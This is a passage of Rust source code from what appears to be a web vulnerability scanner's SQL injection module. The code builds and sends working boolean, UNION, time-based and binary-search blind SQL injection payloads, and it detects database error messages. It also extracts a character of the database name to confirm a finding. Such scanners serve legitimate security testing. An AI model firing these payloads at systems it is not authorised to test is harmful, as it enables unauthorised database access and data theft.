                - TRUE/baseline similarity: {:.1}%\n\
                - FALSE/baseline similarity: {:.1}%\n\
                - Database: {:?}\n\
                - Context: {:?}\n\
                - Technique: {}",
                true_to_baseline * 100.0,
                false_to_baseline * 100.0,
                pair.db_type,
                pair.context,
                pair.description
            );

            Some(
                Vulnerability {
                    id: format!("sqli_boolean_{}", Self::generate_id()),
                    vuln_type: "Boolean-based Blind SQL Injection".to_string(),
                    severity: Severity::Critical,
                    confidence,
                    category: "Injection".to_string(),
                    url: url.to_string(),
                    parameter: Some(param.to_string()),
                    payload: format!(
                        "TRUE: {} | FALSE: {}",
                        pair.true_payload, pair.false_payload
                    ),
                    description: format!(
                        "Boolean-based blind SQL injection in parameter '{}'. Database: {:?}. \
                    Allows byte-by-byte data extraction through boolean logic.",
                        param, pair.db_type
                    ),
                    evidence: Some(evidence),
                    cwe: "CWE-89".to_string(),
                    cvss: 9.8,
                    verified: true,
                    false_positive: false,
                    remediation: "1. Use parameterized queries exclusively\n\
                              2. Implement strict input validation\n\
                              3. Apply principle of least privilege\n\
                              4. Use ORM with built-in protection\n\
                              5. Enable WAF rules\n\
                              6. Monitor database queries"
                        .to_string(),
                    discovered_at: chrono::Utc::now().to_rfc3339(),
                    ml_data: None,
                }
                .with_ml_data(
                    true_response,
                    Some(baseline),
                    Some(pair.true_payload),
                ),
            )
        } else {
            None
        }
    }

    /// Scan for UNION-based SQL injection
    async fn scan_union_based(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        _context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing UNION-based SQLi");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let comment_terminators = match db_type {
            DatabaseType::MySQL => vec!["--", "#", "/**/"],
            DatabaseType::PostgreSQL => vec!["--"],
            DatabaseType::MSSQL => vec!["--", ";--"],
            DatabaseType::Oracle => vec!["--"],
            _ => vec!["--", "#"],
        };

        for terminator in comment_terminators {
            if config.scan_mode.as_str() == "fast" && !vulnerabilities.is_empty() {
                break;
            }

            // Try ORDER BY enumeration
            if let Some(column_count) = self
                .enumerate_columns_order_by(url, param, terminator, &mut tests_run)
                .await
            {
                info!("Detected {} columns using ORDER BY", column_count);

                if let Some(vuln) = self
                    .test_union_injection(
                        url,
                        param,
                        column_count,
                        terminator,
                        baseline,
                        &mut tests_run,
                    )
                    .await
                {
                    if self.is_new_vulnerability(&vuln) {
                        info!("UNION-based SQLi confirmed: {} columns", column_count);
                        vulnerabilities.push(vuln);
                    }
                }
            } else {
                // Fallback: UNION SELECT NULL enumeration
                if let Some(column_count) = self
                    .enumerate_columns_union(url, param, terminator, &mut tests_run)
                    .await
                {
                    info!("Detected {} columns using UNION SELECT", column_count);

                    if let Some(vuln) = self
                        .test_union_injection(
                            url,
                            param,
                            column_count,
                            terminator,
                            baseline,
                            &mut tests_run,
                        )
                        .await
                    {
                        if self.is_new_vulnerability(&vuln) {
                            vulnerabilities.push(vuln);
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Enumerate columns using ORDER BY
    async fn enumerate_columns_order_by(
        &self,
        url: &str,
        param: &str,
        terminator: &str,
        tests_run: &mut usize,
    ) -> Option<usize> {
        let mut last_successful = 0;

        for i in 1..=MAX_COLUMNS {
            let payload = format!("' ORDER BY {}{}", i, terminator);
            let test_url = Self::build_test_url(url, param, &payload);

            *tests_run += 1;

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if self.has_sql_error(&response) {
                        if last_successful > 0 {
                            return Some(last_successful);
                        }
                        return None;
                    } else if response.status_code >= 200 && response.status_code < 400 {
                        last_successful = i;
                    }
                }
                Err(_) => {
                    if last_successful > 0 {
                        return Some(last_successful);
                    }
                    return None;
                }
            }

            if i % 5 == 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        }

        if last_successful > 0 {
            Some(last_successful)
        } else {
            None
        }
    }

    /// Enumerate columns using UNION SELECT NULL
    async fn enumerate_columns_union(
        &self,
        url: &str,
        param: &str,
        terminator: &str,
        tests_run: &mut usize,
    ) -> Option<usize> {
        for i in 1..=MAX_COLUMNS {
            let nulls = vec!["NULL"; i].join(",");
            let payload = format!("' UNION SELECT {}{}", nulls, terminator);
            let test_url = Self::build_test_url(url, param, &payload);

            *tests_run += 1;

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if !self.has_sql_error(&response)
                        && response.status_code >= 200
                        && response.status_code < 400
                    {
                        return Some(i);
                    }
                }
                Err(_) => {}
            }

            if i % 5 == 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
            }
        }

        None
    }

    /// Test UNION injection with confirmed column count
    async fn test_union_injection(
        &self,
        url: &str,
        param: &str,
        column_count: usize,
        terminator: &str,
        baseline: &HttpResponse,
        tests_run: &mut usize,
    ) -> Option<Vulnerability> {
        let nulls = vec!["NULL"; column_count].join(",");
        let payload = format!("' UNION SELECT {}{}", nulls, terminator);
        let test_url = Self::build_test_url(url, param, &payload);

        *tests_run += 1;

        match self.http_client.get(&test_url).await {
            Ok(response) => {
                if self.is_successful_injection(&response, baseline) {
                    let evidence = format!(
                        "Column count: {}\nTerminator: {}\nStatus: {}\nSize: {} bytes",
                        column_count,
                        terminator,
                        response.status_code,
                        response.body.len()
                    );

                    return Some(
                        Vulnerability {
                            id: format!("sqli_union_{}", Self::generate_id()),
                            vuln_type: "UNION-based SQL Injection".to_string(),
                            severity: Severity::Critical,
                            confidence: Confidence::High,
                            category: "Injection".to_string(),
                            url: url.to_string(),
                            parameter: Some(param.to_string()),
                            payload: payload.clone(),
                            description: format!(
                            "UNION-based SQL injection in parameter '{}'. {} columns detected. \
                            Allows direct data extraction from database.",
                            param, column_count
                        ),
                            evidence: Some(evidence),
                            cwe: "CWE-89".to_string(),
                            cvss: 9.8,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Use parameterized queries\n\
                                      2. Implement input validation\n\
                                      3. Apply least privilege\n\
                                      4. Disable detailed errors\n\
                                      5. Use WAF rules"
                                .to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                            ml_data: None,
                        }
                        .with_ml_data(
                            &response,
                            Some(baseline),
                            Some(&payload),
                        ),
                    );
                }
            }
            Err(_) => {}
        }

        None
    }

    /// Scan for time-based blind SQL injection
    async fn scan_time_based(
        &self,
        base_url: &str,
        parameter: &str,
        db_type: &DatabaseType,
        _context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing time-based blind SQLi");

        let payloads = match db_type {
            DatabaseType::MySQL => vec![
                ("' OR SLEEP(5)--", 5000),
                ("' AND SLEEP(5) AND '1'='1", 5000),
                ("' || SLEEP(5)--", 5000),
            ],
            DatabaseType::PostgreSQL => vec![
                ("' OR pg_sleep(5)--", 5000),
                ("' AND pg_sleep(5) AND '1'='1", 5000),
            ],
            DatabaseType::MSSQL => vec![
                ("'; WAITFOR DELAY '0:0:5'--", 5000),
                ("' WAITFOR DELAY '0:0:5'--", 5000),
            ],
            DatabaseType::SQLite => vec![
                ("' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%'||randomblob(10000000))--", 3000),
            ],
            _ => vec![
                ("' OR SLEEP(5)--", 5000),
                ("' OR pg_sleep(5)--", 5000),
                ("'; WAITFOR DELAY '0:0:5'--", 5000),
            ],
        };

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        for (payload, expected_delay) in payloads {
            if config.scan_mode.as_str() == "fast" && !vulnerabilities.is_empty() {
                break;
            }

            let test_url = if base_url.contains('?') {
                format!(
                    "{}&{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(payload)
                )
            } else {
                format!(
                    "{}?{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(payload)
                )
            };

            tests_run += 1;

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    if response.duration_ms as u64 > (expected_delay - 500) {
                        let evidence = format!(
                            "Response time: {}ms (expected delay: {}ms)\nDatabase: {:?}",
                            response.duration_ms, expected_delay, db_type
                        );

                        let vuln = Vulnerability {
                            id: format!("sqli_time_{}", Self::generate_id()),
                            vuln_type: "Time-based Blind SQL Injection".to_string(),
                            severity: Severity::Critical,
                            confidence: Confidence::High,
                            category: "Injection".to_string(),
                            url: test_url,
                            parameter: Some(parameter.to_string()),
                            payload: payload.to_string(),
                            description: format!(
                                "Time-based blind SQL injection in parameter '{}'. Response delayed by {}ms.",
                                parameter, response.duration_ms
                            ),
                            evidence: Some(evidence),
                            cwe: "CWE-89".to_string(),
                            cvss: 9.8,
                            verified: true,
                            false_positive: false,
                            remediation: "1. Use parameterized queries\n\
                                          2. Implement input validation\n\
                                          3. Apply least privilege\n\
                                          4. Timeout protection".to_string(),
                            discovered_at: chrono::Utc::now().to_rfc3339(),
                            ml_data: None,
                        }.with_ml_data(&response, None, Some(payload));

                        if self.is_new_vulnerability(&vuln) {
                            info!(
                                "Time-based blind SQLi detected: {}ms delay",
                                response.duration_ms
                            );
                            vulnerabilities.push(vuln);
                        }
                    }
                }
                Err(e) => {
                    debug!("Time-based test failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Detect actual SQL error patterns in response body
    /// Returns true ONLY for genuine SQL error messages, not forum posts discussing SQL
    fn detect_sql_error_patterns(body: &str) -> bool {
        // These patterns are specific SQL error messages, not general content
        let sql_error_patterns = [
            // MySQL errors
            "you have an error in your sql syntax",
            "mysql_fetch",
            "mysql_query",
            "mysql_num_rows",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "mysqlexception",
            // PostgreSQL errors
            "pg_query",
            "pg_exec",
            "pg_fetch",
            "psycopg2.error",
            "unterminated quoted string",
            // SQL Server errors
            "microsoft ole db provider",
            "odbc sql server driver",
            "sqlsrv_query",
            "[sql server]",
            "incorrect syntax near",
            // SQLite errors
            "sqlite3::exception",
            "sqlite_error",
            "sqlite_query",
            // Oracle errors
            "ora-01756",
            "ora-00933",
            "ora-00936",
            "quoted string not properly terminated",
            // Generic database errors (must include specific context)
            "sql syntax",
            "syntax error at",
            "invalid column",
            "invalid object",
            "unknown column",
            "unrecognized token",
            "division by zero",
            "supplied argument is not a valid",
            "sqlexception",
            "db error:",
            // Framework-specific
            "pdo::query",
            "pdoexception",
            "jdbc driver",
            "adodb.connection",
        ];

        for pattern in sql_error_patterns {
            if body.contains(pattern) {
                return true;
            }
        }
        false
    }

    /// Calculate similarity between two responses
    fn calculate_similarity(&self, response_a: &HttpResponse, response_b: &HttpResponse) -> f64 {
        let status_similarity = if response_a.status_code == response_b.status_code {
            1.0
        } else {
            0.0
        };

        let len_a = response_a.body.len() as f64;
        let len_b = response_b.body.len() as f64;
        let max_len = len_a.max(len_b);
        let min_len = len_a.min(len_b);

        let length_similarity = if max_len == 0.0 {
            1.0
        } else {
            min_len / max_len
        };

        let content_similarity =
            self.calculate_content_similarity(&response_a.body, &response_b.body);

        (status_similarity * 0.25) + (length_similarity * 0.25) + (content_similarity * 0.50)
    }

    /// Calculate content similarity
    /// IMPROVED: Strip dynamic content before comparison to reduce false positives
    fn calculate_content_similarity(&self, text_a: &str, text_b: &str) -> f64 {
        if text_a.is_empty() && text_b.is_empty() {
            return 1.0;
        }
        if text_a.is_empty() || text_b.is_empty() {
            return 0.0;
        }

        // Strip dynamic content that changes on every request
        let cleaned_a = Self::strip_dynamic_content(text_a);
        let cleaned_b = Self::strip_dynamic_content(text_b);

        let sample_a = if cleaned_a.len() > 5000 {
            &cleaned_a[..5000]
        } else {
            &cleaned_a
        };
        let sample_b = if cleaned_b.len() > 5000 {
            &cleaned_b[..5000]
        } else {
            &cleaned_b
        };

        let matches = sample_a
            .chars()
            .zip(sample_b.chars())
            .filter(|(a, b)| a == b)
            .count();

        let max_len = sample_a.len().max(sample_b.len());

        if max_len == 0 {
            1.0
        } else {
            matches as f64 / max_len as f64
        }
    }

    /// Strip dynamic content that changes on every request
    /// This prevents false positives from timestamps, nonces, session IDs, etc.
    fn strip_dynamic_content(text: &str) -> String {
        use regex::Regex;

        let mut cleaned = text.to_string();

        // Remove common dynamic patterns
        let patterns = vec![
            // WordPress nonces
            (Regex::new(r#"_wpnonce=[a-f0-9]+"#).unwrap(), "_wpnonce=NONCE"),
            (Regex::new(r#"nonce":\s*"[a-f0-9]+""#).unwrap(), r#"nonce":"NONCE""#),

            // Session IDs
            (Regex::new(r#"PHPSESSID=[a-zA-Z0-9]+"#).unwrap(), "PHPSESSID=SESSION"),
            (Regex::new(r#"session_id=[a-zA-Z0-9]+"#).unwrap(), "session_id=SESSION"),

            // CSRFs
            (Regex::new(r#"csrf[-_]token[\"']?\s*[:=]\s*[\"']?[a-zA-Z0-9/+=]+"#).unwrap(), "csrf_token=CSRF"),

            // Timestamps (Unix epoch)
            (Regex::new(r"\b1[67]\d{8}\b").unwrap(), "TIMESTAMP"),

            // UUIDs
            (Regex::new(r"[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}").unwrap(), "UUID"),

            // Random hashes (32+ hex chars)
            (Regex::new(r"\b[a-f0-9]{32,}\b").unwrap(), "HASH"),
        ];

        for (pattern, replacement) in patterns {
            cleaned = pattern.replace_all(&cleaned, replacement).to_string();
        }

        cleaned
    }

    /// Check if response has SQL error indicators
    /// Uses highly specific patterns to minimize false positives
    fn has_sql_error(&self, response: &HttpResponse) -> bool {
        let body_lower = response.body.to_lowercase();

        // CRITICAL: Each pattern requires structural elements (quotes, error codes, function names, complete phrases)
        // to avoid matching documentation/tutorial content

        // MySQL patterns - Must include complete phrases or function names with structural elements
        let mysql_errors = [
            "you have an error in your sql syntax",  // Complete MySQL error phrase (>15 chars)
            "check the manual that corresponds to your mysql",  // Complete phrase
            "mysql_fetch_array() expects parameter",  // Function name with parentheses + context
            "mysql_fetch_assoc() expects parameter",
            "mysql_fetch_row() expects parameter",
            "mysql_num_rows() expects parameter",
            "warning: mysql_connect(",  // Function call with opening paren
            "warning: mysql_query(",
            "warning: mysql_fetch",  // Function prefix that requires continuation
            "mysqli_sql_exception",  // Complete exception class name
            "mysql server version for the right syntax",  // Complete phrase
        ];

        // PostgreSQL patterns - Must include function names or complete error format
        let postgres_errors = [
            "pg_query() expects",  // Function with parentheses + context
            "pg_exec() expects",
            "pg_fetch_array() expects",
            "supplied argument is not a valid postgresql",  // Complete error phrase
            "error: syntax error at or near",  // PostgreSQL-specific error format
        ];

        // Oracle patterns - Error codes (already specific with ora-XXXXX format)
        let oracle_errors = [
            "ora-00933",  // Specific Oracle error codes
            "ora-01756",
            "ora-00923",
            "ora-01722",  // Invalid number
            "ora-00936",  // Missing expression
        ];

        // MSSQL patterns - Require complete phrases or quoted context
        let mssql_errors = [
            "microsoft sql server",  // Complete product name
            "odbc sql server driver",  // Complete driver name
            "unclosed quotation mark after the character string",  // Complete error phrase
            "incorrect syntax near '",  // Requires quoted identifier
            "conversion failed when converting",  // Complete MSSQL error phrase
        ];

        // SQLite patterns - Require specific format with function names
        let sqlite_errors = [
            "sqlite3::query()",  // Function with parentheses
            "sqlite3_prepare",  // Specific function name
            "near \"",  // SQLite-specific syntax error format with quote
        ];

        // SQLSTATE error codes (database-agnostic but very specific with brackets)
        let sqlstate_errors = [
            "sqlstate[",  // PDO error format with bracket
            "sqlstate[hy000]",  // Specific states
            "sqlstate[42000]",
            "sqlstate[42s",  // Syntax or access violations
        ];

        // Database-specific column/table errors (with quotes for structural context)
        let structural_errors = [
            "unknown column '",  // Must have opening quote
            "table doesn't exist",  // Complete phrase
            "no such table:",  // SQLite format with colon
        ];

        // Check string patterns first
        let all_patterns = [
            mysql_errors.as_slice(),
            postgres_errors.as_slice(),
            oracle_errors.as_slice(),
            mssql_errors.as_slice(),
            sqlite_errors.as_slice(),
            sqlstate_errors.as_slice(),
            structural_errors.as_slice(),
        ].concat();

        for pattern in &all_patterns {
            if body_lower.contains(pattern) {
                // Additional validation: Make sure it's not in tutorial/article context
                if self.is_likely_database_error(&response.body, pattern) {
                    return true;
                }
            }
        }

        // Check Oracle error code regex (ora-XXXXX format)
        if ORACLE_ERROR_REGEX.is_match(&body_lower) {
            if let Some(matched) = ORACLE_ERROR_REGEX.find(&body_lower) {
                let pattern = matched.as_str();
                if self.is_likely_database_error(&response.body, pattern) {
                    return true;
                }
            }
        }

        // Check SQLite near pattern regex (near "keyword")
        if SQLITE_NEAR_REGEX.is_match(&body_lower) {
            if let Some(matched) = SQLITE_NEAR_REGEX.find(&body_lower) {
                let pattern = matched.as_str();
                if self.is_likely_database_error(&response.body, pattern) {
                    return true;
                }
            }
        }

        false
    }

    /// Validate that the error pattern is in an actual error context, not article content
    /// Uses HTML parsing to detect semantic containers (article, pre, code, tutorial)
    fn is_likely_database_error(&self, body: &str, pattern: &str) -> bool {
        let body_lower = body.to_lowercase();
        let pattern_lower = pattern.to_lowercase();

        // Check if body looks like HTML
        let trimmed = body.trim_start();
        let is_html = trimmed.starts_with("<!")
            || trimmed.starts_with("<html")
            || trimmed.starts_with("<");

        if is_html {
            // Parse as HTML document
            let document = Html::parse_document(body);

            // Check if pattern is inside false positive containers
            for selector in FP_SELECTORS.iter() {
                for element in document.select(selector) {
                    let text = element.text().collect::<String>().to_lowercase();
                    if text.contains(&pattern_lower) {
                        // Pattern found inside FP container (article, pre, code, tutorial, etc.)
                        return false;
                    }
                }
            }
        }

        // For non-HTML responses or patterns not in FP containers,
        // check for true positive indicators in text context
        if let Some(pos) = body_lower.find(&pattern_lower) {
            // Get surrounding context (100 chars before and after)
            let start = pos.saturating_sub(100);
            let end = (pos + pattern_lower.len() + 100).min(body.len());
            let context = &body_lower[start..end];

            // TRUE POSITIVE indicators - pattern is in error output context
            let true_positive_indicators = [
                "error",
                "warning",
                "exception",
                "fatal",
                "<br",           // Error messages often have line breaks
                "\n",            // Multi-line error output
                "stack trace",
                "backtrace",
            ];

            // Require at least one true positive indicator for high confidence
            for indicator in &true_positive_indicators {
                if context.contains(indicator) {
                    return true;
                }
            }
        }

        // Default to false - require positive evidence
        false
    }

    /// Normalize response text for comparison by stripping dynamic content
    /// Removes timestamps, session IDs, CSRF tokens to avoid false negatives
    fn normalize_for_comparison(&self, text: &str) -> String {
        let mut normalized = text.to_string();

        // Strip ISO timestamps (2026-01-31T13:08:28Z)
        normalized = TIMESTAMP_ISO.replace_all(&normalized, "[TIMESTAMP]").to_string();

        // Strip common date/time formats (01/31/2026 1:08:28 PM)
        normalized = TIMESTAMP_COMMON.replace_all(&normalized, "[TIMESTAMP]").to_string();

        // Strip HTML comments
        normalized = HTML_COMMENTS.replace_all(&normalized, "").to_string();

        // Strip session IDs and CSRF tokens (common patterns)
        let session_patterns = [
            (r"session(?:id)?[=:]\s*[a-f0-9]{16,}", "[SESSION]"),
            (r"csrf[_-]?token[=:]\s*[a-zA-Z0-9+/=]{16,}", "[CSRF]"),
            (r"_token[=:]\s*[a-zA-Z0-9+/=]{16,}", "[TOKEN]"),
        ];

        for (pattern, replacement) in &session_patterns {
            if let Ok(re) = Regex::new(pattern) {
                normalized = re.replace_all(&normalized, *replacement).to_string();
            }
        }

        // Normalize whitespace (multiple spaces/tabs/newlines to single space)
        normalized = WHITESPACE_NORMALIZE.replace_all(&normalized, " ").to_string();

        normalized.trim().to_string()
    }

    /// Calculate normalized similarity between two responses using similar crate
    /// Returns a ratio between 0.0 (completely different) and 1.0 (identical)
    fn calculate_normalized_similarity(&self, text1: &str, text2: &str) -> f64 {
        let normalized1 = self.normalize_for_comparison(text1);
        let normalized2 = self.normalize_for_comparison(text2);

        // Use TextDiff to calculate similarity
        let diff = TextDiff::from_chars(&normalized1, &normalized2);
        diff.ratio().into()
    }

    /// Evaluate similarity ratio and return categorized level
    fn evaluate_similarity(&self, ratio: f64) -> SimilarityLevel {
        if ratio > 0.9 {
            SimilarityLevel::NearlyIdentical
        } else if ratio > 0.7 {
            SimilarityLevel::SlightlyDifferent
        } else if ratio > 0.5 {
            SimilarityLevel::ModeratelyDifferent
        } else {
            SimilarityLevel::VeryDifferent
        }
    }

    /// Check for SQL error and return database type if found
    /// Returns Some(database_name) if SQL error detected, None otherwise
    fn has_sql_error_with_db(&self, response: &HttpResponse) -> Option<String> {
        let body_lower = response.body.to_lowercase();

        // Check for specific database error patterns
        let db_patterns = [
            ("mysql", vec!["you have an error in your sql syntax", "mysql_fetch", "mysqli_sql_exception"]),
            ("postgresql", vec!["pg_query() expects", "pg_exec() expects", "error: syntax error at or near"]),
            ("oracle", vec!["ora-00933", "ora-01756", "ora-00923"]),
            ("mssql", vec!["microsoft sql server", "odbc sql server driver", "incorrect syntax near"]),
            ("sqlite", vec!["sqlite3::query()", "sqlite3_prepare"]),
        ];

        for (db_name, patterns) in &db_patterns {
            for pattern in patterns {
                if body_lower.contains(pattern) {
                    // Verify it's in error context
                    if self.is_likely_database_error(&response.body, pattern) {
                        return Some(db_name.to_string());
                    }
                }
            }
        }

        // Check regex patterns
        if ORACLE_ERROR_REGEX.is_match(&body_lower) {
            if let Some(matched) = ORACLE_ERROR_REGEX.find(&body_lower) {
                if self.is_likely_database_error(&response.body, matched.as_str()) {
                    return Some("oracle".to_string());
                }
            }
        }

        if SQLITE_NEAR_REGEX.is_match(&body_lower) {
            if let Some(matched) = SQLITE_NEAR_REGEX.find(&body_lower) {
                if self.is_likely_database_error(&response.body, matched.as_str()) {
                    return Some("sqlite".to_string());
                }
            }
        }

        None
    }

    /// Calculate confidence level based on number of positive signals
    /// Multi-signal approach: requires multiple indicators for high confidence
    fn calculate_confidence(signals: &DetectionSignals) -> Confidence {
        let mut signal_count = 0;

        if signals.has_specific_error_pattern {
            signal_count += 1;
        }
        if signals.database_type.is_some() {
            signal_count += 1;
        }
        if signals.context_is_error_output {
            signal_count += 1;
        }
        if matches!(signals.baseline_similarity, SimilarityLevel::VeryDifferent) {
            signal_count += 1;
        }
        if signals.status_code >= 500 {
            signal_count += 1;
        }

        // 4+ signals = High confidence (95%+ accuracy)
        // 3 signals = High confidence (90%+ accuracy)
        // 2 signals = Medium confidence (70-80% accuracy)
        // 1 signal = Low confidence (50-60% accuracy)
        // 0 signals = No detection
        match signal_count {
            4.. => Confidence::High,
            3 => Confidence::High,
            2 => Confidence::Medium,
            1 => Confidence::Low,
            _ => Confidence::Low,
        }
    }

    /// Calculate weighted confidence score (0.0-1.0)
    /// Weights: pattern 0.35, db_type 0.15, context 0.25, baseline 0.15, status 0.10
    fn weighted_score(signals: &DetectionSignals) -> f64 {
        let mut score = 0.0;

        if signals.has_specific_error_pattern {
            score += 0.35;
        }
        if signals.database_type.is_some() {
            score += 0.15;
        }
        if signals.context_is_error_output {
            score += 0.25;
        }
        match signals.baseline_similarity {
            SimilarityLevel::VeryDifferent => score += 0.15,
            SimilarityLevel::ModeratelyDifferent => score += 0.10,
            _ => {}
        }
        if signals.status_code >= 500 {
            score += 0.10;
        }

        score
    }

    /// Detect SQL injection using multi-signal approach
    /// Requires weighted score >= 0.5 for positive detection
    fn detect_sqli_with_signals(&self, response: &HttpResponse, baseline: &HttpResponse) -> Option<DetectionSignals> {
        let db_type = self.has_sql_error_with_db(response);
        let has_pattern = db_type.is_some();

        // Check if pattern is in error context (using existing validation)
        let context_is_error = if has_pattern {
            self.has_sql_error(response)
        } else {
            false
        };

        // Calculate normalized baseline similarity
        let similarity_ratio = self.calculate_normalized_similarity(&baseline.body, &response.body);
        let similarity_level = self.evaluate_similarity(similarity_ratio);

        let signals = DetectionSignals {
            has_specific_error_pattern: has_pattern,
            database_type: db_type,
            context_is_error_output: context_is_error,
            baseline_similarity: similarity_level,
            status_code: response.status_code,
        };

        let score = Self::weighted_score(&signals);

        // Require score >= 0.5 for positive detection
        if score >= 0.5 {
            Some(signals)
        } else {
            None
        }
    }

    /// Check if injection was successful
    fn is_successful_injection(&self, response: &HttpResponse, baseline: &HttpResponse) -> bool {
        if response.status_code < 200 || response.status_code >= 400 {
            return false;
        }

        if self.has_sql_error(response) {
            return false;
        }

        if response.body == baseline.body {
            return false;
        }

        if response.body.len() < 10 {
            return false;
        }

        let response_nulls = response.body.to_uppercase().matches("NULL").count();
        let baseline_nulls = baseline.body.to_uppercase().matches("NULL").count();

        if response_nulls > baseline_nulls {
            return true;
        }

        let size_diff = (response.body.len() as i64 - baseline.body.len() as i64).abs();
        let baseline_size = baseline.body.len() as f64;

        if baseline_size > 0.0 {
            let size_change = (size_diff as f64 / baseline_size) * 100.0;
            if size_change > 20.0 {
                return true;
            }
        }

        false
    }

    /// Scan for binary search blind SQLi (8x faster than character-by-character)
    async fn scan_binary_search_blind(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        context: &InjectionContext,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing binary search blind SQLi");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // First, verify boolean-based injection works
        let verification_pairs = self.get_binary_search_verification_payloads(db_type, context);

        for (true_payload, false_payload, db_name) in verification_pairs {
            let true_url = Self::build_test_url(url, param, true_payload);
            let false_url = Self::build_test_url(url, param, false_payload);

            tests_run += 2;

            let true_response = match self.http_client.get(&true_url).await {
                Ok(resp) => resp,
                Err(_) => continue,
            };

            let false_response = match self.http_client.get(&false_url).await {
                Ok(resp) => resp,
                Err(_) => continue,
            };

            let true_similarity = self.calculate_similarity(baseline, &true_response);
            let false_similarity = self.calculate_similarity(baseline, &false_response);

            // Verify boolean logic works
            if true_similarity > 0.85 && false_similarity < 0.70 {
                info!(
                    "Boolean logic verified, testing binary search extraction for {}",
                    db_name
                );

                // Attempt to extract first character of database name using binary search
                if let Some((extracted_char, search_tests)) = self
                    .binary_search_extract_char(url, param, baseline, db_type, context, 1)
                    .await
                {
                    tests_run += search_tests;

                    let evidence = format!(
                        "Binary search blind SQLi verified:\n\
                        - Extracted character: '{}' (ASCII {})\n\
                        - Database: {:?}\n\
                        - Requests for extraction: {} (vs 100+ for brute force)\n\
                        - TRUE/baseline similarity: {:.1}%\n\
                        - FALSE/baseline similarity: {:.1}%\n\
                        - Efficiency gain: ~8x faster than character-by-character",
                        extracted_char as char,
                        extracted_char,
                        db_type,
                        search_tests,
                        true_similarity * 100.0,
                        false_similarity * 100.0
                    );

                    let vuln = Vulnerability {
                        id: format!("sqli_binary_search_{}", Self::generate_id()),
                        vuln_type: "Binary Search Blind SQL Injection".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::High,
                        category: "Injection".to_string(),
                        url: url.to_string(),
                        parameter: Some(param.to_string()),
                        payload: format!("Binary search: {} requests to extract char", search_tests),
                        description: format!(
                            "Binary search blind SQL injection in parameter '{}'. Allows efficient data \
                            extraction using binary search (5-7 requests per character vs 100+ for brute force). \
                            Successfully extracted character '{}' from database.",
                            param, extracted_char as char
                        ),
                        evidence: Some(evidence),
                        cwe: "CWE-89".to_string(),
                        cvss: 9.8,
                        verified: true,
                        false_positive: false,
                        remediation: "1. Use parameterized queries exclusively\n\
                                      2. Implement strict input validation\n\
                                      3. Apply principle of least privilege\n\
                                      4. Monitor for unusual query patterns\n\
                                      5. Implement rate limiting\n\
                                      6. Use WAF with blind SQLi detection".to_string(),
                        discovered_at: chrono::Utc::now().to_rfc3339(),
                        ml_data: None,
                    }.with_ml_data(&true_response, Some(baseline), Some(true_payload));

                    if self.is_new_vulnerability(&vuln) {
                        vulnerabilities.push(vuln);
                        break;
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Get verification payloads for binary search
    fn get_binary_search_verification_payloads(
        &self,
        db_type: &DatabaseType,
        context: &InjectionContext,
    ) -> Vec<(&'static str, &'static str, &'static str)> {
        let mut payloads = Vec::new();

        match db_type {
            DatabaseType::MySQL => match context {
                InjectionContext::Numeric => {
                    payloads.push((
                        " AND ASCII(SUBSTRING(DATABASE(),1,1))>0",
                        " AND ASCII(SUBSTRING(DATABASE(),1,1))>255",
                        "MySQL",
                    ));
                }
                _ => {
                    payloads.push((
                        "' AND ASCII(SUBSTRING(DATABASE(),1,1))>0 AND '1'='1",
                        "' AND ASCII(SUBSTRING(DATABASE(),1,1))>255 AND '1'='1",
                        "MySQL",
                    ));
                }
            },
            DatabaseType::PostgreSQL => match context {
                InjectionContext::Numeric => {
                    payloads.push((
                        " AND ASCII(SUBSTRING(current_database(),1,1))>0",
                        " AND ASCII(SUBSTRING(current_database(),1,1))>255",
                        "PostgreSQL",
                    ));
                }
                _ => {
                    payloads.push((
                        "' AND ASCII(SUBSTRING(current_database(),1,1))>0 AND '1'='1",
                        "' AND ASCII(SUBSTRING(current_database(),1,1))>255 AND '1'='1",
                        "PostgreSQL",
                    ));
                }
            },
            DatabaseType::MSSQL => match context {
                InjectionContext::Numeric => {
                    payloads.push((
                        " AND ASCII(SUBSTRING(DB_NAME(),1,1))>0",
                        " AND ASCII(SUBSTRING(DB_NAME(),1,1))>255",
                        "MSSQL",
                    ));
                }
                _ => {
                    payloads.push((
                        "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>0 AND '1'='1",
                        "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>255 AND '1'='1",
                        "MSSQL",
                    ));
                }
            },
            _ => {
                // Generic approach - try MySQL syntax
                match context {
                    InjectionContext::Numeric => {
                        payloads.push((
                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>0",
                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>255",
                            "Generic",
                        ));
                    }
                    _ => {
                        payloads.push((
                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>0 AND '1'='1",
